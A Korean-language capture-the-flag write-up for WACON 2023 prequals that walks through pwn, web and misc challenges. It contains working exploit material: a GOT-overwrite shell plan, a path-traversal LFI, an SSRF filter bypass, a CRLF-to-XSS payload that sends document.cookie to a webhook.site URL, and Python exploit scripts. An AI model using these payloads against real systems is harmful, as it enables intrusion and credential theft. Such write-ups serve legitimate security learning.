# WACON 2023 Prequal Writeup

# PWN

## flash-memory

---

### ○ checksec

```php
└─# checksec app        
[*] '/root/dream/flash-memory/app'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

`Partial RELRO`이므로 GOT overwrite를 이용한 풀이가 가능할 것이라고 생각하고 넘어갈 수 있다.

몇 가지 기능들이 존재하는데, 기능들을 분석하는 것이 중요한 문제이므로 분석하고 넘어가도록 하자.

```c
stream = fopen("/proc/self/maps", "r");
if ( !stream )
{
  printf("Could not open file.\n");
  return 1;
}
memset(s, 0, sizeof(s));
memset(haystack, 0, 0x100uLL);
while ( 1 )
{
  a2 = (char **)"%lx-%lx %4s";
  if ( (unsigned int)__isoc99_fscanf(stream, "%lx-%lx %4s", &src, &v13, s) == -1 )
    break;
  fgets(haystack, 256, stream);
  if ( strstr(s, "w") && !strstr(haystack, "heap") && !strstr(haystack, "stack") )
  {
    qword_4A40 = (__int64)src;
    addr = (void *)((unsigned __int64)(unsigned int)crc32((__int64)&qword_4A40, 8uLL) << 12);
    len = v13 - (_QWORD)src;
    mmap(addr, v13 - (_QWORD)src, 3, 33, -1, 0LL);
    memcpy(addr, src, len);
    printf("Saved : 0x%lx\n", addr);
    qword_49C0[qword_40B8] = len;
    qword_4940[qword_40B8] = addr;
    v3 = qword_40B8++;
    qword_48C0[v3] = src;
  }
}
a1 = "======================================\n";
printf("======================================\n");
```

프로그램을 실행하면 `/proc/self/maps`를 읽어서 w 권한이 있는 영역의 src 주소를 출력해준다.

참고로 src 주소는 `crc32(src)`를 거친 결과로 생성되고 12비트 왼쪽으로 시프트한 값이 출력되는 방식이다.

이런 식으로 w 권한이 있는 src map을 생성한다.

```c
int sub_1310()
{
  puts("1. Load Memory");
  puts("2. Allocate Memory");
  puts("3. Read Memory");
  puts("4. Write Memory");
  puts("0. Exit");
  return printf(":> ");
}
```

다음은 사용자가 사용할 수 있는 기능이다.

간단하게 요약하면 다음과 같다.

1. Load : Restart `main()`
2. Allocate: w 권한이 있는 메모리 영역을 src map에 추가 할당
3. Read: src map에 할당된 메모리 영역을 read
4. Write: src map에 할당된 메모리 영역에 write

```c
case 2u:
  if ( !qword_4A48 )
  {
    memset(v20, 0, 0x21uLL);
    printf("PrivKey :> ");
    sub_1360(v20, 32LL);
    printf("Size :> ");
    ::len = (int)sub_13C0();
    v5 = strlen(v20);
    v9 = (void *)((unsigned __int64)(unsigned int)crc32((__int64)v20, v5) << 12);
    mmap(v9, ::len, 3, 33, -1, 0LL);
    qword_4A48 = (__int64)v9;
    a2 = (char **)v9;
    a1 = "Your Map: %p\n";
    printf("Your Map: %p\n", v9);
  }
  continue;
```

취약점이 발생하는 부분은 allocate다.

crc32 결과를 주소로 src map을 생성한다. 만약, crc32를 역연산 할 수 있다면 임의의 주소를 src map으로 할당할 수 있다.

[https://github.com/theonlypwner/crc32](https://github.com/theonlypwner/crc32)

crc32 역연산은 위 코드를 참고하면 쉽게 해결할 수 있다.

따라서 처음에 출력된 src map 중 data 영역의 주소를 allocate하여 libc_base 영역을 read & write 할 수 있도록 컨트롤하는 방식으로 exploit이 가능하다.

```c
case 3u:
  if ( qword_4A48 )
  {
    a1 = "Index :> ";
    printf("Index :> ");
    v8 = (int)sub_13C0();
    if ( v8 < ::len )
    {
      a2 = (char **)(v8 + qword_4A48);
      a1 = (_BYTE *)(&dword_0 + 1);
      write(1, (const void *)(v8 + qword_4A48), ::len - v8);
    }
  }
  continue;
```

read를 이용해서 data 영역의 메모리 데이터를 출력하면, libc_base를 획득할 수 있다.

```python
case 4u:
  if ( qword_4A48 )
  {
    a1 = "Index :> ";
    printf("Index :> ");
    v7 = (int)sub_13C0();
    if ( v7 < ::len )
    {
      a2 = (char **)(v7 + qword_4A48);
      a1 = 0LL;
      read(0, (void *)(v7 + qword_4A48), ::len - v7);
    }
  }
  continue;
```

획득한 libc_base를 기반으로 write 기능을 이용해서 `strlen GOT`을 system으로 덮어쓰고 case 2를 호출해서 PrivKey로 `/bin/sh`를 입력하면 쉘을 획득할 수 있다.

```python
WACON2023{1781c5a33dff309f0989949de542aa3faf475766450fb12ff607116073a58138}
```

# WEB

## mosaic

---

이미지를 업로드하고 모자이크 처리하는 서비스를 제공하는 시나리오다.

크게 2가지 취약점이 존재한다.

1. `LFI` due to incorrect validation
    1. LFI로 admin password를 알아내고 admin 계정으로 로그인
2. mitigation bypass `SSRF`
    1. index 페이지에 정의된 localhost 검증 우회

```python
@app.route('/check_upload/@<username>/<file>')
def check_upload(username, file):
    #print('test test')
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    if username == "admin" and session["username"] != "admin":
        return "Access Denied.."
    else:
        return send_from_directory(f'{UPLOAD_FOLDER}/{username}', file)
```

잘못된 검증으로 인해 LFI가 발생하는 코드다.

```php
send_from_directory(f'{UPLOAD_FOLDER}/{username}', file)
```

라우팅 조건에 맞게 직접 경로에 접근하면, 지정한 경로의 파일을 읽을 수 있는 기능을 제공한다.

```php
/check_upload/@../app.py

/check_upload/@../password.txt
```

username에 대한 검증이 없어서 위와 같이 이전 경로에 접근이 가능하다.

따라서 위와 같이 접근하여 이전 경로에 존재하는 파일을 leak 할 수 있고 이를 이용해서 LFI로 `password.txt`를 읽을 수 있다.

### ○ password.txt

```php
# admin pw
2c3c519aa578fed9391ba8e1d40ce746412970ed7088be40b2046f28047a611f
```

```python
@app.route('/', methods=['GET'])
def index():
    if not session.get('logged_in'):
        return '''<h1>Welcome to my mosiac service!!</h1><br><a href="/login">login</a>&nbsp;&nbsp;<a href="/register">register</a>'''
    else:
        if session.get('username') == "admin" and request.remote_addr == "127.0.0.1":
            print('exploit success!!')
            copyfile(FLAG, f'{UPLOAD_FOLDER}/{session["username"]}/flag.png')
        return '''<h1>Welcome to my mosiac service!!</h1><br><a href="/upload">upload</a>&nbsp;&nbsp;<a href="/mosaic">mosaic</a>&nbsp;&nbsp;<a href="/logout">logout</a>'''
```

다음으로 index 페이지를 보자.

계정이 admin이고 `remote_addr`이 `127.0.0.1`인 경우에 admin 디렉토리로 `flag.png`를 복사한다. 

admin 계정에 대한 조건은 만족했지만, `remote_addr` 검증을 우회하기 위해 SSRF 벡터가 필요하다.

```python
@app.route('/mosaic', methods=['GET', 'POST'])
def mosaic():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    if request.method == 'POST':
        image_url = request.form.get('image_url')
        if image_url and "../" not in image_url and not image_url.startswith("/"):
            guesstype = mimetypes.guess_type(image_url)[0]
            ext = guesstype.split("/")[1]
            #print(guesstype)
            #print(ext)
            mosaic_path = os.path.join(f'{MOSAIC_FOLDER}/{session["username"]}', f'{os.urandom(8).hex()}.{ext}')
            filename = os.path.join(f'{UPLOAD_FOLDER}/{session["username"]}', image_url)
            print(f'hi : {filename}')
            if os.path.isfile(filename):
                print('no trigger!')
                image = imageio.imread(filename)
            elif image_url.startswith("http://") or image_url.startswith("https://"):
                return "Not yet..! sry.."
            else:
                if type_check(guesstype):
                    image_data = requests.get(image_url, headers={"Cookie":request.headers.get("Cookie")}).content
                    print('trigger!')
                    print(request.headers.get("Cookie"))
                    print(image_data)
                    image = imageio.imread(image_data)
            
            apply_mosaic(image, mosaic_path)
            return render_template("mosaic.html", mosaic_path = mosaic_path)
        else:
            return "Plz input image_url or Invalid image_url.."
    return render_template("mosaic.html")
```

`/mosaic`를 보면, 적절한 몇 가지 mitigation 검증 후에 else 문에서  `request.get()`을 실행한다는 것을 알 수 있다.

```c
if image_url and "../" not in image_url and not image_url.startswith("/"):
```

여기서 SSRF를 하기 위해서는 크게 3가지 정도의 검증을 우회해야한다. 가장 핵심은 `startswith()`와 확장자 검증을 우회하는 것이다.

```php
[공백]http://127.0.0.1:9999/#test.png
```

위와 같이 공백을 이용하면 쉽게 mitigation을 우회하고 SSRF를 수행 할 수 있다. 

SSRF를 수행하면, `flag.png`가 admin 디렉토리에 복사된다.

```php
/check_upload/@admin/flag.png
```

마지막으로 위와 같이 접근하여 `flag.png`를 읽으면 된다.

```python
# file_remover.py
import os, time
from threading import Thread

def flag_remover():
    while True:
        try:
            time.sleep(3)
            os.system("rm -rf /app/uploads/admin/*")
            os.system("rm -rf /app/static/uploads/admin/*")
        except:
            continue

def userfile_remover():
    while True:
        try:
            time.sleep(600)
            os.system("rm -rf /app/uploads/*/*")
            os.system("rm -rf /app/static/uploads/*/*")
        except:
            continue

th1 = Thread(target=flag_remover)
th2 = Thread(target=userfile_remover)
th1.start()
th2.start()
```

주의할 점은 `file_remover.py`로 인해서 SSRF로 `flag.png`를 복사해오더라도 거의 바로 삭제된다는 점이다. 따라서 SSRF와 LFI를 동시에 수행하여 flag를 획득해야한다.

필자는 브라우저 2개를 열고 연속으로 실행했다.

```php
WACON2023{5b0cdb7e3f4e3c5bffed24f178a5c9ff16a54d9d8ce98e75c44146ed4c59d3c0}
```

## **warmup-revenge**

---

```python
<?php
	include('./config.php');
	ob_end_clean();

	if(!trim($_GET['idx'])) die('Not Found');
	
	$query = array(
		'idx' => $_GET['idx']
	);

	$file = fetch_row('board', $query);
	if(!$file) die('Not Found');

	$filepath = $file['file_path'];
	$original = $file['file_name'];

	if(preg_match("/msie/i", $_SERVER['HTTP_USER_AGENT']) && preg_match("/5\.5/", $_SERVER['HTTP_USER_AGENT'])) {
	    header("content-length: ".filesize($filepath));
	    header("content-disposition: attachment; filename=\"$original\"");
	    header("content-transfer-encoding: binary");
	} else if (preg_match("/Firefox/i", $_SERVER['HTTP_USER_AGENT'])){
	    header("content-length: ".filesize($filepath));
	    header("content-disposition: attachment; filename=\"".basename($file['file_name'])."\"");
	    header("content-description: php generated data");
	} else {
	    header("content-length: ".filesize($filepath));
	    header("content-disposition: attachment; filename=\"$original\"");
	    header("content-description: php generated data");
	}
	header("pragma: no-cache");
	header("expires: 0");
	flush();

	$fp = fopen($filepath, 'rb');

	$download_rate = 10;

	while(!feof($fp)) {
	    print fread($fp, round($download_rate * 1024));
	    flush();
	    usleep(1000);
	}
	fclose ($fp);
	flush();	
?>
```

핵심은 파일 이름으로 CRLF를 사용할 수 있고 이를 통해 `content-disposition` 헤더를 덮어쓸 수 있다는 것이다. 

즉, header injection이 가능하다.

이를 이용해서 응답을 다운로드 파일로 표시하는 대신 내용을 포함한 인라인 페이지로 만들 수 있으며, script 태그를 삽입하면 XSS가 가능하다.

```python
header("content-disposition: attachment; filename=\"$original\"");
```

예를 들면, CRLF를 이용해서 `test\rtest.html`과 같은 일부 문자를 포함하면 헤더를 덮어쓸 수 있다.

```python
$insert['file_name'] = $_FILES['file']['name'];
```

`Board.php`를 보면, 파일을 업로드할 수 있고 파일명으로 CRLF를 사용할 수 있다. 

```python
Content-Security-Policy: default-src 'self'; style-src 'self'
```

적용된 CSP를 보자. 

동일한 도메인의 스크립트만 포함할 수 있다. 

우회 방법은 실행할 자바스크립트 코드가 포함된 파일을 먼저 업로드한 다음 download.php 페이지에서 해당 js 코드를 포함하는 다른 파일을 업로드하는 것이다.

```python
------WebKitFormBoundarydFZmSiashN04RJ1C
Content-Disposition: form-data; name="file"; filename="test.html"
Content-Type: text/html

document.location='https://webhook.site/05ca15ce-f3fb-451c-a0b5-e8616892f419?'+document.cookie
```

먼저, 위와 같은 js 파일을 업로드 한다.

```python
------WebKitFormBoundarydFZmSiashN04RJ1C
Content-Disposition: form-data; name="file"; filename="test\r.html"
Content-Type: text/html

<script src="/download.php?idx=843"></script>
```

js 파일을 로드하기 위해서 이름에 CRLF가 포함된 2번째 파일을 업로드한다.

마지막으로 test\r.html을 bot에게 전송하면 플래그를 획득할 수 있다.

```python
WACON2023{b1b1e2b97fcfd419db87b61459d2e267}
```

# MISC

## mic check

---

페이지에 접속하면 404 에러가 발생한다.

```php
User-agent: *
allow: /W/A/C/O/N/2/
```

`robots.txt`에 접속하면 위와 같이 접근 가능한 경로를 확인할 수 있다.

하지만 `/W/A/C/O/N/2/` 경로에 접근해도 브라우저 상에서는 404 에러가 발생하는 것은 변함이 없다. 그러나 1가지 차이점이 있다면 개발자 도구로 패킷을 확인해보면 200 응답이 온다는 것이다.

```php
/W/A/C/O/N/2/0/2/3

/W/A/C/O/N/2/0/2/3/{
```

경로가 flag를 상징하는 것이라는 의심과 함께 위와 같이 전송해보면 모두 200 응답이 반환된다.

즉, 200 응답이 반환되는 경우에는 옳바른 flag라는 것을 알 수 있다.

정리하자면, flag를 알아내기 위해서 1자리씩 `directory boosting`을 진행해야한다.

```php
import requests
import string

url = "http://58.225.56.196:5000"

# flag condition
characters = string.ascii_lowercase + string.digits + '}{'

# start path
path = "/W/A/C/O/N/2/0/2/3"

# directroy boosting
flag = 0
while True:
  if flag == 1:
    break
  for char in list(characters):
    test = f'{path}/{char}'
    res = requests.get(url=url+test)
    if res.status_code == 200:
      path = f'{path}/{char}'
      print(path)
      if char == '}':
        flag = 1
      break

print(path.replace('/', ''))
```

```php
WACON2023{2060923e53fa205a48b2f9ad47d943c4}
```

## Web?

---

### ○ eval.js

```python
const fs = require("fs");
let filter = null;
try {
    filter = fs.readFileSync("config").toString();
} catch {}

const expr = atob(process.argv.pop());
const regex = new RegExp(filter);
if (regex.test(expr)) {
    console.log("Nop");
} else {
    console.log(eval(expr));
}
```

config 파일에 정의된 정규표현식을 우회해서 `eval()`로 임의의 명령을 실행하는 것이 목적이다.

### ○ main.js

```python
app.post("/calc", loginHandler, (req,res) => {
	if(checkoutTimes.has(req.ip) && checkoutTimes.get(req.ip)+1 > now()) {
		return res.json({ error: true, msg: "too fast"})
	}
	checkoutTimes.set(req.ip,now())

    const { expr, opt } = req.body;
    const args = ["--experimental-permission", "--allow-fs-read=/app/*"];

    const badArg = ["--print", "-p", "--input-type", "--import", "-e", "--eval", "--allow-fs-write", "--allow-child-process", "-", "-C", "--conditions"]

    if (!expr || typeof expr !== "string" ) {
        return res.json({ msg: "invalid data" });
    }

    if (opt) {
        if (!/^--[A-Za-z|,|\/|\*|\=|\-]+$/.test(opt) || badArg.includes(opt.trim())) {
            return res.json({ error: true, msg: "Invalid option" });
        }
        args.push(opt, "eval.js", btoa(expr));
    }

    args.push("eval.js", btoa(expr));

	try {
		ps = child_process.spawnSync("node", args);
        result = ps.stdout.toString().trim();
        if (result) {
            return res.type("text/plain").send(result)
        } 
        return res.type("text/plain").send("Empty");
	} catch (e) {
        console.log(e)
        return res.json({ "msg": "Nop" })
    }
});
```

`main.js`를 보면, `opt`과 `expr`을 입력해서 인자로 사용하는 eval 함수를 실행할 수 있다.

하지만 opt와 expr 모두 각각의 mitigation이 존재한다. 따라서 이것을 우회하면서 system command를 실행하도록 payload를 완성해야한다.

```python
#!/bin/bash
node --experimental-permission --allow-fs-read=/app/* --allow-child-process /app/main.js
```

`run.sh`를 보면, `--allow-fs-read`로 모든 파일이 허용된 것을 알 수 있다.

```python
const badArg = ["--print", "-p", "--input-type", "--import", "-e", "--eval", "--allow-fs-write", "--allow-child-process", "-", "-C", "--conditions"]
```

opt에 대한 검증을 수행하는 `badArg`를 보면 `--allow-fs-read` 는 없다는 것을 알 수 있다.

즉, `eval.js`를 실행할 때, `--allow-fs-read` 옵션을 주고 실행할 수 있다.

```python
const fs = require("fs");
let filter = null;
try {
    filter = fs.readFileSync("config").toString();
} catch {}
```

`eval.js`를 다시 보면, config 파일을 읽고 filter로 사용한다.

만약, 여기서 권한 문제로 config 파일을 읽지 못한다면 filter에는 아무 값도 저장되지 않을 것이다.

즉, eval 명령을 자유롭게 사용할 수 있다.

```python
{
    "expr": "require('fs').readFileSync('/flag.txt',{ encoding: 'utf8', flag: 'r' })",
    "opt": "--allow-fs-read=/app/eval*,/flag*"
}
```

따라서 솔루션은 간단하다.

opt로 `--allow-fs-read`를 지정해서 `eval.js`와 `flag.txt`만 read 권한을 허용한다. 다음으로 `/flag.txt`를 읽는 system command를 expr로 입력해서 실행하면 된다.

### ○ exploit

```python
from requests import *
import json

s = Session()

def post_req(path):
  url = f"http://58.229.185.29/{path}"
  #url = f"http://127.0.0.1/{path}"
  
	# Add Content-Type header
  header = {'Content-Type':'application/json'}
  
  if path == 'login':
    data = {
      "username":"keyme",
      "password":"keyme123"
    }
  else:
    data = {
      "expr": "require('fs').readFileSync('/flag.txt',{ encoding: 'utf8', flag: 'r' })",
      "opt": "--allow-fs-read=/app/eval*,/flag*"
    }
	
	# Dump from data to json type
  res = s.post(url=url, data=json.dumps(data), headers=header)
  #print(data)

  print(res.text)
 
post_req('login')
post_req('calc')
```

익스 과정에서 주의할 점은

```python
app.use(bodyParser.json());
```

`main.js`에서 위와 같이 json 형태를 그대로 받아서 파싱한다는 점이다.

따라서 `{'Content-Type':'application/json'}`으로 요청하고 `json.dump(data)`해서 보내야지 정상적으로 요청이 전달된다.

```python
WACON2023{9fd79a4784869ba4873aee15c94f15281fa0e26c606e0da6f34f158f46f40889}
```